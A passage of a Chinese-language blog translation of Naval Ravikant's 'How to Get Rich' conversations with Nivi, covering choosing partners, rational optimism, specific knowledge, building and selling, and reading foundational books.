id="选择高智商、精力和正直的商业伙伴"><a href="#选择高智商、精力和正直的商业伙伴" class="headerlink" title="选择高智商、精力和正直的商业伙伴"></a>选择高智商、精力和正直的商业伙伴</h3><p>Naval：在挑选同事方面，选择那些高智商、精力充沛、正直的人，这是你不能妥协的三个要素。</p><p>你需要和聪明的人共事，至少他们不是在错误的方向上一路向西。你需要与精力充沛的人共事，因为世界上到处都是聪明却懒惰，光想不干的人。在生活中，我们都认识一些非常聪明的人，他们可以不起床，或者动一动手指就完成很多事情。我们也知道有些人精力很旺盛，但并不聪明，他们工作非常非常努力，但有时在朝着错误的方向埋头苦干。smart不是一个贬义词。这并不是说有人聪明，有人愚蠢。我想表达的意思是，每个人在不同的事情上会表现出很聪明的一面。因此，取决于你想做什么，你才可以找到在这方面很聪明的人来帮你。</p><p>然后关于精力，很多时候人们对特定的事情没有动力，但对其他事情有动力。例如，有人可能真的没有动力一天都坐在办公室里工作。但他们可能真的有动力去画画，对吧?</p><p>嗯，那样的话，他们应该是画家。他们应该把自己的艺术放到网上，试着探索如何以此为基础建立自己的事业，而不是认命了，戴着项圈，去做一份乏味的工作。这一定是一个长期的事情，很多人在兴致勃勃的发布第一个作品后，发现没有立马收获1w+粉丝的关注而对自己大失所望，然后以此为由失去动力就放弃了。我想说的是，<strong>做一件事情的动力终究来自于你自己到底想做什么，觉得什么有意义，而不是为了讨好别人</strong>。</p><p>最后一点是正直，正直是最重要的，如果只有另外两个品质，你就选择了一个聪明、勤奋的骗子，他最终会欺骗你。所以，你必须弄清楚这个人是否正直。</p><p>我之前说过，你要通过信号判断。信号是他们做什么，而不是他们说什么。当他们认为没有人在看他们时，他们会做一些非语言的事情。</p><h3 id="动机必须是内在的"><a href="#动机必须是内在的" class="headerlink" title="动机必须是内在的"></a>动机必须是内在的</h3><p>Nivi：Sam Altman之前有个有趣的观点，当谈到委任时，他说：“委任的关键在于，让人们做他们<strong>擅长同时是你想让他们做的事情</strong>。”这个道理显而易见，你会和那些自然会做你想让他们做的事情的人合作。</p><p>Naval：是的。如果我认为他们不喜欢我想让他们做的事情，我几乎不会创办公司，不会雇人，也不会和别人一起工作。</p><p>当我年轻的时候，我常常试着说服别人。但事实证明，你可以说服某人帮你做一件事，但是有时候你不能。你无法让他们保持动力。你可以在一开始就给他们灵感，但除非你是像亨利五世那样的国王，拥有那样的权力指使别人做事情。但如果你想让人们长期保持动力，这种动力必须是内在的。你不能只是创造它，如果他们没有内在的动力，你也不能成为他们的拐杖。所以，你必须确保员工精力充沛，愿意做你希望他们做的事，愿意和你一起工作，一起创造。</p><h3 id="诚信反映在一个人的行为，而不是他说了什么"><a href="#诚信反映在一个人的行为，而不是他说了什么" class="headerlink" title="诚信反映在一个人的行为，而不是他说了什么"></a>诚信反映在一个人的行为，而不是他说了什么</h3><p>解读信号非常非常重要。信号不是人们说什么，而是他们做了什么。因此，注意细微的信号是很重要的。举个例子，比如在公众场合，如果有人对服务员态度非常不好，那么他们对你不好只是时间问题。如果有人压制了一个敌人，并对他们怀恨在心，那么他们把你从朋友重新定义为敌人只是时间问题，你会感受到他们的愤怒。所以，愤怒，愤怒，报复，短视的人在现实生活中的很多互动中都是这样的。人们奇怪地一致，至少身体很诚实。所以，你想找到长期合作的伙伴，你要找的是那些似乎没有理性道德的人。</p><p>举个例子，我有一个朋友，他的公司是我投资的，但是公司接近倒闭，他本可以把所有的投资者都鸽了。但他不断地投入越来越多的个人资金，直到公司最终又站起来。在这个过程中，他从未让投资者血本无归。为此我一直很感激他。我说，“哇，你对投资人这么好真是太棒了，你没有坑他们。他觉得被冒犯了。他说：“我这样做不是为了你（投资人），是为了我自己。这关乎我的自尊，是我真正关心的东西。”这种人才是你想要共事的人。</p><p>另一个我喜欢的引用，是我另一条相关的推特。我是在别的地方读到它，但是我稍微修改了一下。</p><p>“<strong>自尊是你对自己的评价</strong>”。</p><p>好人，有道德的人，容易共事的人，可靠的人，往往有很高的自尊，因为他们对自己的声誉非常在意，他们深刻的明白声誉的重要性。</p><h2 id="第十二条：与理性的乐观主义者合作"><a href="#第十二条：与理性的乐观主义者合作" class="headerlink" title="第十二条：与理性的乐观主义者合作"></a>第十二条：与理性的乐观主义者合作</h2><p><em>不要与愤世嫉俗者和悲观主义者为伴：他们总是以自我为中心</em></p><h3 id="不要与悲观主义者为伍"><a href="#不要与悲观主义者为伍" class="headerlink" title="不要与悲观主义者为伍"></a>不要与悲观主义者为伍</h3><p>Nivi：最后一条推文。你说：“不要与愤世嫉俗者和悲观主义者为伍。他们总是自以为是。</p><p>Naval：是的。本质上，要创造事物，你必须是一个理性的乐观主义者。理性的意思是你必须看清世界的真相。<strong>但你必须对自己的能力保持乐观</strong>，对自己想要完成的使命保持乐观。</p><p>我们都知道有些人总是很悲观，他们会否定一切。每个人的生活中都有乐于助人的批判者，对吧？他认为他是在帮忙，但实际上他只是在批评（就像我所说的专业的评论家），而且他对每件事都很失望。这样的人不仅在他的生活中不会成就任何伟大的事情，他们还会阻止周围的人做一些伟大的事情或有大胆的想法。他们往往享受挑刺儿的快感，但从未想过提供更好的解决问题的方案，对，他们就是只说不做。有一句经典的军事台词：“要么当头儿，要么服从，要么滚。”这些人想要第四种选择，他们不想当领导，不想跟随，但又不想让路。他们就是想方设法告诉你为什么这事儿行不通。</p><p>我认识的所有真正成功的人都有很强的行动力，<strong>他们只是做事。判断一件事是否可行的最简单方法就是去做</strong>，至少做第一步，第二步，第三步，然后再决定下一步。</p><p>因此，如果你想在生活中取得成功，创造财富，或者拥有良好的人际关系，或者保持健康，甚至是快乐，你需要有一种超强的行动力，这样才能获得你想要的。</p><h3 id="与理性的乐观主义者合作"><a href="#与理性的乐观主义者合作" class="headerlink" title="与理性的乐观主义者合作"></a>与理性的乐观主义者合作</h3><p>你要对合理的东西保持乐观。众所周知，没有什么比一个鲁莽的人去追求不值得的东西更糟糕的了。这就是为什么我说“理性”的乐观主义者。你需要在了解所有的陷阱，知道事物不利的一面的情况下，依旧保持乐观。</p><p>每个人只在这个星球上活一次，为什么不试着做点大事呢？这就是埃隆·马斯克这种人的牛逼之处，我认为他之所以能激励这么多人，是因为他承担了非常、非常大胆的责任和使命。他为人们树立了一个树立远大理想的榜样。即使是做一些小东西也要花很多功夫。我不认为街角杂货店老板的工作强度比埃隆·马斯克(Elon Musk)低，也不认为他付出的汗水和辛劳比马斯克少，甚至更多。无论是教育水平还是所处环境，不管什么原因，他们没有机会去想那么多，所以影响力就不那么大。因此，最好还是想得远一点。当然还是要理性地，在你的能力范围内保持乐观。</p><p>愤世嫉俗者和悲观主义者，他们真正想说的是，这很不幸，但他们基本上是在说，“我放弃了。我想我什么都做不了。所以对我来说，这个世界就像一个没有人能做任何事的世界。”所以他们不理解别人为什么费劲儿地要去做一些事情。</p><h3 id="我们是悲观主义者的后代"><a href="#我们是悲观主义者的后代" class="headerlink" title="我们是悲观主义者的后代"></a>我们是悲观主义者的后代</h3><p>Nivi：也许做一个不理性的乐观主义者或做一个理性的愤世嫉俗者可能更好。</p><p>Naval：对于为什么你应该成为一个乐观主义者，有一个完全理性的框架。历史上，如果你回到2000年，5000年，10000年，两个人在丛林中漫步，他们听到了老虎的声音。一个是乐观主义者，说，“哦，它不是朝我们这边来的。另一个说：“我是个悲观主义者，我要离开这里。”悲观的人跑了，活了下来，乐观的人被吃掉了。</p><p>我们是悲观主义者的后代，我们天生就是悲观主义者。但现代社会要安全得多，没有老虎在街上游荡，虽然你应该避免彻底破产，但你最终不太可能一无所有。</p><p>我想分享的理念是，对于一个人来说，<strong>他的境遇是有下限的，但上限却很难说</strong>（白话说是你很难饿死，但是成功却不可限量）。因此，适应现代社会意味着要克服你的悲观情绪，做出稍微不理性的乐观押注，因为如果你创办下一个SpaceX、特斯拉(Tesla)或优步(Uber)，你可以为社会和自己创造数十亿美元的价值，并改变世界。</p><p>“<strong>如果你失败了，有什么大不了的？你损失了几百万美元的投资人（VC）的钱，而他们还有更多钱，这就是他们对你成功的赌注。</strong>”</p><p>对过去悲观是有道理的，对今天保持乐观是有意义的，尤其对于这么多受过高等教育且生活在第一世界国家的人，甚至是第三世界国家的人。我反而认为第三世界国家的经济机会要大得多。</p><p>当然，你必须注意的一件事就是，不要做任何违法的事情，远离可能会带来灾难性的损失的事。尽可能不做对身体有害的事情，注意你的健康。远离那些会让你失去所有资本和储蓄的事情。</p><p>因此，不要孤注一掷。但理性乐观的押注会带来巨大的好处。</p><h2 id="第十三条：用特殊技能（Specific-knowledge）武装自己"><a href="#第十三条：用特殊技能（Specific-knowledge）武装自己" class="headerlink" title="第十三条：用特殊技能（Specific knowledge）武装自己"></a>第十三条：用特殊技能（Specific knowledge）武装自己</h2><p>Naval：如果你想变得富有，你需要想办法获得“规模化”的收入，而不是仅仅期盼每个月的工资。责任感决定了你的客户为什么选择你，杠杆效应决定了它可以被规模化。为什么大家要付给你钱而不是给别人，这需要<strong>特殊的技能</strong>。这里提到的特殊技能可能是整个推特风暴中最难传达的东西，也是人们可能最困惑的部分。</p><p>人们普遍持有一种观点是，任何事情都可以从学校学来，都可以“被传授”，但事实上最有价值的事情不是教来的。但好在任何事情都可以学，大部分情况下你想学的东，要么来源于你的兴趣或DNA，要么是源于你从小养成的一些习惯，这些在之后非常难被“教”会；当然也可能是一些全新的东西，所以没有人知道怎么做；或者在工作培训中也是如此，你在高度复杂的环境中进行各种尝试，在一个特定的领域建立判断。典型的例子就是投资，但也可以是其他方面。可以是开拖拉机的技巧，也可以是预测天气的能力。</p><p>因此特殊技能就是你特别关注的技能，尤其是你已经到了20、21、22之后，你几乎就不用去选你需要什么样的特殊技能了。你需要做的就是回顾之前的人生经历中，你建立了什么样的技能是你觉得可以着重被发展的。</p><h3 id="特殊技能无法被训练出来"><a href="#特殊技能无法被训练出来" class="headerlink" title="特殊技能无法被训练出来"></a>特殊技能无法被训练出来</h3><p>特殊技能不是教出来的。如果学校可以教这些东西，那么其他人也可以接受培训，然后我们就可以大规模生产和大规模培训人员。我们甚至可以编程让电脑来做，让机器人来做。如果是这样的话，你就很容易被替代。当有无数的人可以经过培训做这件事的时候，雇主支付给你的只是最低工资，为的就是让你做“这件事”。<strong>你获得的收入=投资培训所产生的回报-培训你的成本</strong>。</p><h3 id="特殊技能与你的兴趣高度相关"><a href="#特殊技能与你的兴趣高度相关" class="headerlink" title="特殊技能与你的兴趣高度相关"></a>特殊技能与你的兴趣高度相关</h3><p>举个例子，一个人拿到了心理学学位后，成为了一名销售人员。如果他已经拥有比较好的销售技巧，那么心理学就可以作为一种杠杆，使他在销售上做得更好。但如果他一直是一个内向的人，从来都不擅长销售，他们试图用心理学来学习销售，他们不会做得很好。因此，你会发现更多的特殊技能是通过认识到你的天赋、你真正的好奇心和你的热情而建立起来的。不是为了最热门的工作去上学，也不是盲目进入投资人认为的最热门的领域创业。</p><h3 id="特殊技能往往处于知识的边缘"><a href="#特殊技能往往处于知识的边缘" class="headerlink" title="特殊技能往往处于知识的边缘"></a>特殊技能往往处于知识的边缘</h3><p>它也是一些刚刚被发现或者很难被发现的东西。因此，如果你不是100%的投入，其他人会比你做得更好。他们不会比你好一点点，他们会比你好很多，因为现在我们正在运营创意领域，非常适用于复利，适用于杠杆。如果你的杠杆率为1000倍，有人在80％的时间都是正确的，而其他人在90％的时间都是正确的，那么90％的时间正确的人将因为市场的杠杆作用和复利获得数百倍的报酬。因此，如果你想确保自己在这方面具有优势，真正具有好奇心非常重要。</p><h3 id="建立特殊技能对你来说就像游戏"><a href="#建立特殊技能对你来说就像游戏" class="headerlink" title="建立特殊技能对你来说就像游戏"></a>建立特殊技能对你来说就像游戏</h3><p>很多时候，它不是你坐下来然后推理的东西，它更多的是通过观察发现的。你几乎不得不回顾自己的生活，看看自己到底擅长什么。例如，我想成为一名科学家，所以我所坚持的价值观都是围绕着「科学家」来建立的。我认为真正的科学家处于人类生产链条的顶端，他们做出了真正的突破和贡献，对人类社会的贡献可能比任何其他阶层的人都要大。当然，我并不是说艺术、政治、工程或商业等贡献小，但如果没有科学，我们仍然会在泥土中挣扎，用棍子打架，每天忙着生火。我的整个价值体系都是围绕着科学家建立的，我想成为一名伟大的科学家。</p><p>但当我真正回头看我擅长的东西，以及我最终把时间花在了什么事情上时，我发现更多的是围绕着赚钱，钻研技术，卖东西（思想），解释事情，和人们交谈。所以，我有一些销售技巧，这是一种形式的具体知识；我有一些关于如何赚钱的分析技巧；我对数据足够敏感，有收集数据，整理并分析数据的能力，这也是我的一个特殊技能。当然我也喜欢摆弄技术。所有这些对我来说都像是游戏，但对其他人来说却是工作。</p><p>有些人会觉得这些事情很难，他们会说，“好吧，我怎么才能变得善于表达和推销想法呢?”如果你不是很擅长，或者你不是很喜欢，也许这不是你的专长，专注于你真正喜欢的事情。</p><p>有点讽刺的是，第一个指出我真正擅长什么的人是我的母亲。她是在厨房里说这些话的，当时我大概15、16岁。当我在和一个朋友说我想成为一名天体物理学家，她说：“不，你更适合去经商。”</p><p>我一脸懵逼，“啥？我妈妈不知道她在说什么吧。”</p><p><strong>但事实上，妈妈当然知道她在说什么</strong>。她已经注意到，每次我们走在街上，我都会批评当地的披萨店，为什么他们要用特定的配料和特定的方式出售披萨，为什么他们点披萨的过程是这样的，而实际上应该是那样的。因此，她知道我对商业更有好奇心，到后来与我对科学的痴迷结合起来，创造了技术和科技企业，我才发现了真正的自己。因此，你的特殊技能可能是由那些了解你的人观察到的，而且经常是由那些了解你的人观察到的。</p><h2 id="第十四条：特殊技能（specific-knowledge）极富创造性或技术性"><a href="#第十四条：特殊技能（specific-knowledge）极富创造性或技术性" class="headerlink" title="第十四条：特殊技能（specific knowledge）极富创造性或技术性"></a>第十四条：特殊技能（specific knowledge）极富创造性或技术性</h2><h3 id="特殊技能能通过课程传授获得"><a href="#特殊技能能通过课程传授获得" class="headerlink" title="特殊技能能通过课程传授获得"></a>特殊技能能通过课程传授获得</h3><p>Naval: 如果说特殊技能可以被传授，那就是在工作中，通过学徒制。这就是为什么最好的企业、最好的职业是学徒或自学的职业，因为这些都是社会还没有弄清楚如何培训以及使其批量自动生产的事情。这方面的经典例子是沃伦·巴菲特从学校毕业后去找了本杰明·格雷厄姆。本杰明·格雷厄姆（Benjamin Graham）是《聪明的投资者》（Intelligent Investor）一书的作者，可以说他将价值投资发展成了一套理论并将其发扬光大。巴菲特去找了本杰明·格雷厄姆，并主动提出<strong>免费</strong>为他工作。</p><p>但格雷厄姆说：“你开的价格太高了，免费恰恰是一种高价格。”格雷厄姆说得没错。就像后来1954年时格雷厄姆决定要与巴菲特共事时（给予他学徒机会），巴菲特给他多少钱都不为过。</p><h3 id="特殊的技能具有高度的创造性或者技术性"><a href="#特殊的技能具有高度的创造性或者技术性" class="headerlink" title="特殊的技能具有高度的创造性或者技术性"></a>特殊的技能具有高度的创造性或者技术性</h3><p>特定的技能也往往具有技术性和创造性。它在技术的前沿，艺术的前沿，交流的前沿。再举个例子，在今天，互联网上有一些梗王能够创造出令人难以置信的梗，并将这一想法传播给数百万人。斯科特·亚当斯（Scott Adams）就是一个很好的例子，他通过有说服力的文字和视频做出准确的预测，基本上正在成为世界上最可信的人之一。</p><p>这是他多年来积累起来的特殊技能，因为他年轻时就沉迷于催眠，他通过漫画学会了如何沟通，并很早就开始用直播平台Periscope，所以他一直在练习和人对话，他读过所有关于这个话题的书，他将工作融入到生活的点点滴滴。</p><p>这是一个在职业生涯中积累了特殊技能的人的例子。它具有高度的创造性，它具有技术性的元素，而且它永远不会被机器自动化所取代。<br>没有人会把这一点从他身上夺走，因为斯科特·亚当斯（Scott Adams）为了发展自己的品牌也尽心尽力。他积极地创作Dilbert系列卡通画、写书，并懂得借助Periscope直播平台的媒体优势运作。他在这个品牌上拥有巨大的影响力，如果他想在现有的基础上创造更多的财富，他现在积累的东西就他的杠杆。</p><h3 id="特殊的技能特定于个体和情境"><a href="#特殊的技能特定于个体和情境" class="headerlink" title="特殊的技能特定于个体和情境"></a>特殊的技能特定于个体和情境</h3><p>Nivi：我们应该称之为独特的知识还是特殊的技能更贴切？</p><p>Naval： 我很小的时候就提出了这个框架，当时特殊的技能就一直伴随着我，我没有尝试改变它是因为我所发现的每一个术语都以不同的方式夸大其词。至少特殊的技能（specific knowledge）这个词没被过度消费，因此我可以赋予他新的含义。独特知识的问题是，是的，也许它是独一无二的，但是如果我从别人那里学到它，它就不再是独一无二的，那么就是我们都知道的东西了。所以，与其说它是独一无二的，不如说它是高度依附于现实的，根据个体的实际情况，根据具体问题存在的，它只能依赖于在这个领域中极度的痴迷、兴趣和所花在这个领域的时间来获得。它不能仅仅从一本书中直接读出，也不能在只在一门课程中获得，也不能被设计成一个算法。</p><h3 id="特殊技能不能刻意获得"><a href="#特殊技能不能刻意获得" class="headerlink" title="特殊技能不能刻意获得"></a>特殊技能不能刻意获得</h3><p>Nivi：说到斯科特·亚当斯，他在博客上发表过一篇文章叫做「努力在2个或以上的领域做到前25%」的文章。在此摘录一段：</p><blockquote><p>如果你想要一个普通的成功的生活，不需要太多的计划。只要远离麻烦，去上学，申请你可能喜欢的工作。但如果你想要与众不同的东西，你有两条路:</p><ol><li>成为某方面的最牛逼的人（世界第一梯队）</li><li>在两件或两件以上的事情上变得非常优秀(前25%)。</li></ol><p>第一种策略几乎是不可能的。很少有人能在NBA打球，也很少有人能出一张白金唱片。真的很难，我不建议任何人去尝试。</p><p>第二种策略相当简单。每个人都至少有几个领域是他们可以努力进入前25%的。就我而言，我比大多数人画得都好，但我算不上艺术家。我并不比一般的单口相声演员更幽默，虽然我从来没有成功过，但我比大多数人都更幽默。神奇的是，很少有人能画得很好，也很少有人能写笑话。正是这两者的结合，让我的作品变得如此罕见。当你再加上我的商业背景，我突然有了一个很少有漫画家不亲身经历就能理解的话题。</p><p>我总是建议年轻人成为优秀的演说家(前25%)。任何人都可以通过练习来做这件事。如果你把这种才能加到其他任何一种才能上，你就会突然成为那些只有一种才能的人的老板。或者在你的工程学位、法律学位、医学学位、科学学位或其他任何学位的基础上再获得一个商学学位。突然之间，你掌握了主动权，或者你正在利用自己的综合知识创办自己的公司。</p></blockquote><p>因此，不要试图在一件事情上做到最好，这太难了。你需要尝试在三件或更多的事情上做到非常优秀。这是一种获得特殊技能的方式吗？</p><p>Naval：我认为最好的方法就是追随自己的内心真正喜欢的事物。在你脑海的某个角落，你会意识到，事实上，这个方面我喜欢，我会留意它的商业方面的可能性。</p><p>但我认为，如果你单单为了获得「特殊技能」无病乱投医，或过于以目标为导向地关注钱，那么你不会选择做正确的事情，不会选择你喜欢做的事，所以你不会真正深入进去。根据统计数据，斯科特・亚当斯的观察结果很准。就知识而言，今天有 10,000 个对人类有价值的区域，这 10,000 个区域中排名第一那些位置已经被抢占了。除非你碰巧成为各种领域最痴迷的一万人之一，否则其他人可能会成为这万人中的第一人。</p><p>当你开始把3728种一流的销售技巧和很好的写作技巧以及一个非常了解会计和财务的人结合起来，当这个交叉点的需求到来时，你已经通过组合数学从10000扩展到了数百万或数千万。所以，它只是变得没有竞争力。此外，收益在递减。因此，在三四件事上成为前25%要比在某件事上成为世界第一容易得多。</p><h3 id="在你擅长得领域建立自己的特殊技能"><a href="#在你擅长得领域建立自己的特殊技能" class="headerlink" title="在你擅长得领域建立自己的特殊技能"></a>在你擅长得领域建立自己的特殊技能</h3><p>natural是天生的、本来的意思，这里翻译成擅长的。我认为这是一个非常务实的方法。但最重要的是，我认为一个人不要太刻意地开始积累，因为你内心其实是想挑选你最擅长的东西。每个人都有与生俱来的擅长的东西。</p><p>我们都很熟悉这句话，一个有天赋的人。“哦，这个人是天生的与人为善的人，这个人就是社交名媛的料，这个人是天生的程序员，这个人是天生的读者。”所以，不管是干什么的料，你都会想着在这方面加倍努力。</p><p>因为人类的个性非常复杂，你可能在很多方面都很有天赋。如果把你在这些方面的天赋结合起来，这样你就可以自动地，仅仅通过纯粹的兴趣和享受，在很多事情上，最终达到25%，10%甚至5%的最高水平。</p><h2 id="第十五条：学会销售，学会建造"><a href="#第十五条：学会销售，学会建造" class="headerlink" title="第十五条：学会销售，学会建造"></a>第十五条：学会销售，学会建造</h2><p><em>如果你两者都能做到，你将势不可挡</em></p><h3 id="学会销售，学会建造"><a href="#学会销售，学会建造" class="headerlink" title="学会销售，学会建造"></a>学会销售，学会建造</h3><p>Nivi：谈到技能组合，你说过你应该“学会销售（Sale），学会建造（Build），如果你两者都能做到，你将势不可挡。”</p><p>Naval：这是一个非常广泛的范畴。其中之一是开发产品，即建造。这很难，而且定义很多元。它可以包括设计，开发，可以包括制造，物流，采购，甚至是设计和完成一整套服务。在每个行业，都有一个建造者的定义。在我们所处的科技行业，就是首席技术官CTO，程序员，软件工程师，硬件工程师。但即使在洗衣行业，也可能是创立洗衣服务的人，让物流准时到达的人，确保所有的衣服在正确的时间出现在正确的地方的人，等等。另一方面是销售。同样，销售也有一个非常宽泛的定义。销售不一定只意味着卖东西给个人，它可以意味着营销，意味着沟通，意味着招聘。它也可以意味着筹集资金，意味着鼓舞人心，意味着做公关，等等。</p><h3 id="硅谷模式：建造者-销售者-最佳拍档"><a href="#硅谷模式：建造者-销售者-最佳拍档" class="headerlink" title="硅谷模式：建造者+销售者=最佳拍档"></a>硅谷模式：建造者+销售者=最佳拍档</h3><p>总的来说，硅谷的创业模式是最好的。最常见的形式是有两个创始人，其中一个擅长销售（Sale），另一个擅长搭建（Build）。举几个经典例子，比如苹果创始人史蒂夫·乔布斯和史蒂夫·沃兹尼亚克；微软的盖茨和艾伦在早期可能有类似的分工；谷歌的拉里和谢尔盖可能稍微有点不同，可能是因为谷歌早期交付的是一个非常技术性的产品——搜索，通过一个简单的UI直达终端用户。</p><p>在硅谷，你会看到这种模式反复出现。一个建造者和一个销售者的组合：CTO和CEO的组合。风险投资者和技术投资者几乎心照不宣的尽可能地寻找这种组合，这就是神奇的组合定律。</p><h3 id="如果你两者都能做到，你将势不可挡"><a href="#如果你两者都能做到，你将势不可挡" class="headerlink" title="如果你两者都能做到，你将势不可挡"></a>如果你两者都能做到，你将势不可挡</h3><p>如果一个人可以同时做到这两者，这才是真正的超能力。那时你就是可以创造整个行业的人。马一龙(Elon Musk)就是一个活生生的例子。他不一定是自己造火箭，但他实际上做出了技术上的贡献。他使自己成为最了解这项技术的人，没人会对他说三道四，他也不会说一些自己做不到的事（意思是说到就会做到）。他视时间为朋友，并想尽办法运用它。即使是史蒂夫·乔布斯（Steve Jobs）也拥有足够的产品技能，并且对产品的参与度也很高，实际上他也同时具备这两种能力。拉里·埃里森（Larry Ellison）最初是一名程序员，他编写了Oracle的第一个版本，或者说他深度参与其中。马克·安德森（Marc Andreessen）也属于这一类。他可能对自己的销售技能没有足够的信心，但是他可是写出Netscape Navigator的程序员，或者至少是其中很大的一部分。因此，我认为在任何领域中真正的巨人就是可以「自产自销」的人。</p><h3 id="宁愿教工程师销售，也不愿教营销人员工程？"><a href="#宁愿教工程师销售，也不愿教营销人员工程？" class="headerlink" title="宁愿教工程师销售，也不愿教营销人员工程？"></a>宁愿教工程师销售，也不愿教营销人员工程？</h3><p>我认为你可以从建造技能开始入手，并在你人生的早期尽量掌握一定的建造技能。或者你有足够的时间可以专心地学习销售，而且你正好有一定的天赋和亲和力促使你成为一个好的销售者。这样你做事的效果可以翻番。<br>现在我们谈到的销售技能可能不同于传统概念中的，卖东西。</p><p>举个例子，假设你是一个很棒的工程师，然后人们会说，你需要擅长销售。你可能不擅长上门推销东西，但你可能是一个很好的作家。写作是一种比面对面销售门槛更低的技能，所以你可以培养写作技能，直到你成为一个良好的在线交流者，然后将其运用在你的销售上。另一种情况，你可能是一个很好的建造者，但你不擅长写作，你不喜欢与大众沟通，但你擅长一对一说服，所以你可能会用你的销售技能来招聘或募资，这需要更多一对一方向的努力。</p><p>因此，如果你在这两个领域的十字路口，千万不要绝望。因为你不可能成为最好的技术，也不会是最好的销售人员。但神奇的是，我们再回到斯科特·亚当斯（Scott Adams）的技能组合理论，将两个技能是结合将是不可阻挡的。</p><p>从长远来看，那些了解潜在需求产品的人，知道如何建造和销售它的人，最能受到顶尖投资者的青睐。如果他们有足够的精力，他们可以突破任何障碍，做成任何事情。</p><p>Nivi：如果你只能选一个擅长的，你会选哪一个?</p><p>Naval：抛开噪音来说，建造的技能实际上是更好的，因为市场上充斥着太多的骗子和没有任何内核的销售人员。当你刚起步、想要被认可的时候，建造技能会更好。但是之后的建造会很累，因为这是一项专注的工作，很难保持与时俱进，因为总是会有新人出现，有新产品，有更新的工具。</p><p>因此，随着时间的推移，销售技巧实际上更容易产生规模效应。比如，如果你在构建产品上享有声誉，这是好的，但当你推出你的新产品时，我将去验证的是产品本身（意思是和建造的名声关系不大）。但是，如果你在大家的眼中是一个值得信赖的生意伙伴，并且你很有说服力，善于沟通，那么这个名声会让很多事变得容易很多。</p><p>因此，我认为如果你需要选一个，<strong>你可以从建造开始，然后过渡到销售</strong>。这是一个比较中庸的答案，但我觉得这奏是大实话。</p><h2 id="第十六条：阅读你所热爱的内容-直到你爱上阅读"><a href="#第十六条：阅读你所热爱的内容-直到你爱上阅读" class="headerlink" title="第十六条：阅读你所热爱的内容 直到你爱上阅读"></a>第十六条：阅读你所热爱的内容 直到你爱上阅读</h2><p><em>你应该可以在图书馆中拿起任何一本书阅读</em></p><h3 id="阅读你所热爱的内容-直到你爱上阅读"><a href="#阅读你所热爱的内容-直到你爱上阅读" class="headerlink" title="阅读你所热爱的内容 直到你爱上阅读"></a>阅读你所热爱的内容 直到你爱上阅读</h3><p>Nivi：在我们讨论责任、影响力和判断之前，你已经有了一些相关的推特，我会把它们放在持续学习的范畴。这些推文本质上是在说，“没有所谓的商业技能。少读商业杂志和商业课程，学习微观经济学、博弈论、心理学、说服力、伦理学、数学和计算机”。你在Periscope上还发表了另一条评论“你应该可以从容的拿起图书馆里的任何一本书来读。”这一类的最后一条推特是，“阅读比听快，做比看快”。</p><p>Naval：是的，这是最重要的一条，因为学习的基础是阅读。我认识的聪明人，他们都经常读书。</p><p>问题是，<strong>我读什么？我怎么读</strong>？因为对大多数人来说，这是一场斗争，是一件家务活儿。但是，读书不是目的，重要的是学会如何教育自己，教育自己的方法就是培养对阅读的热爱。我想说的是，“<strong>读你喜欢的内容，直到你爱上阅读</strong>。”就这么简单。</p><p>我认识的每一个经常读书的人都“爱”阅读，他们爱读书是因为他们读自己喜欢的书。这有点像第二十二条，阅读是没有门槛的，你可以随时开始，然后不断积累，直到它成为一种习惯。接着，你开始不满足于只涉猎单一的领域。</p><p>也就是说，你可以从读小说开始，接着你可以读科幻小说，你可以读非小说，然后你可以读科学，哲学，数学甚至更多。但是重要的是，这个过程是顺其自然非强迫的，读你感兴趣的东西，直到你理解它们。然后你就会自然而然地进入下一步，再下一步。</p><h3 id="阅读某一领域的科学原著"><a href="#阅读某一领域的科学原著" class="headerlink" title="阅读某一领域的科学原著"></a>阅读某一领域的科学原著</h3><p>但是，你会发现在你真正想学的东西中，有太多东西要读。我要提醒的是，即使是阅读也充满了垃圾。实际上有些东西你可以阅读，特别是在早期，<strong>它会以某种方式对你的大脑进行编程</strong>，然后在你阅读的后期，你会根据之前的东西来分辨这些东西是真是假。因此，阅读基础性的东西是很重要的。基础性的东西，是在特定领域最原始（fundamental）书籍，在本质上是经过时间和历史的检验，科学的东西。</p><p>比如，与其读一本商业畅销书，不如读亚当·斯密的《国富论》。与其读今天谁写的一本关于生物学或进化论的书，我更愿意读达尔文《物种起源》。与其现在读一本可能非常先进的生物技术方面的书，我只想学习Horace F. Judson的《创世第八天》(The Eighth Day of Creation)。你不必死磕关于宇宙学和尼尔·德格拉斯·泰森和斯蒂芬·霍金一直在说什么的高级书籍，你需要的是拿起理查德·费曼的《费曼讲物理：入门》，从基础物理学开始。</p><h3 id="不要害怕任何书"><a href="#不要害怕任何书" class="headerlink" title="不要害怕任何书"></a>不要害怕任何书</h3><p>如果你基础打的好，特别是数学、物理和科学，那么你就不会害怕任何一本书。我们所有人都有那种坐在教室里学数学的记忆，这一切都是合乎逻辑的，而且都是有意义的，直到有一次，课程进度太快，我们跟不上了。<br>在那之后，我们被留下来背方程式，记忆概念，却无法从第一原理中推导出它们。在那一刻，我们迷失了，因为除非你是一个专业的数学家，否则你不会记得这些东西。你要记住的是技术，基础。</p><p>因此，你必须确保阅读是建立在一个理解的框架上，因为你正在为建摩天大楼打地基，而不只是在反复记忆你不断在丢失的东西。所以基础非常重要。</p><p>最后，阅读的终极是当你走进一个图书馆，你上下打量，你不害怕这里的任何一本书。因为你知道你可以把任何一本书从书架上拿下来，你就能阅读它，理解它，你可以接收什么是真的，拒绝什么是假的。你有一套自己的方法论，分辨哪些是逻辑和科学的，而不仅仅是基于大字报和意见（opinions）。</p><h3 id="学习的手段是丰富的，学习的欲望是稀缺的"><a href="#学习的手段是丰富的，学习的欲望是稀缺的" class="headerlink" title="学习的手段是丰富的，学习的欲望是稀缺的"></a>学习的手段是丰富的，学习的欲望是稀缺的</h3><p>互联网的美丽是整个亚历山大图书馆的十倍，并且时刻在你的指尖，为你所用。不是教育手段或学习手段稀缺，相反稀缺的是学习的欲望。所以，你真的要培养欲望。</p><p>欲望意味着我不允许这种能力的丧失。孩子们天生就有好奇心。如果你去找一个第一次学语言的小孩，他们总是问：这是什么？那是什么？这是为什么？那是谁？他们总是问问题。</p><p>但问题之一是，学校和我们的教育系统，甚至我们培养孩子的方式，都用顺从取代了好奇。<strong>一旦你用顺从取代好奇心，你就会成为一个顺从的工厂工人，而不再是一个创造性的思考者。你需要创造力，你需要有激励自己的大脑去学习你想要的东西的能力</strong>。</p><h2 id="第十七条：数学和逻辑才是一切事物的基础"><a href="#第十七条：数学和逻辑才是一切事物的基础" class="headerlink" 